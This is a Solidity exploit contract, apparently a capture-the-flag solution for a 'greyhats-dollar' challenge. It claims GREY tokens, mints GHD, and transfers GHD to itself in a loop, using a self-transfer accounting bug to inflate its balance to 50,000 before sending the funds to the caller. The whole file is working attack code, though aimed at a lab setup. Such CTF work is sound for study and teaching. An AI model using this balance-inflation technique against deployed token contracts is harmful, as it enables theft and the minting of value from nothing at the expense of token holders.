// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup } from "src/greyhats-dollar/Setup.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Mint 1000 GHD using 1000 GREY
        setup.grey().approve(address(setup.ghd()), 1000e18);
        setup.ghd().mint(1000e18);

        // Transfer GHD to ourselves until we have 50,000 GHD
        uint256 balance = setup.ghd().balanceOf(address(this));
        while (balance < 50_000e18) {
            setup.ghd().transfer(address(this), balance);
            balance = setup.ghd().balanceOf(address(this));
        }

        // Transfer all GHD to msg.sender
        setup.ghd().transfer(msg.sender, balance);
    }
}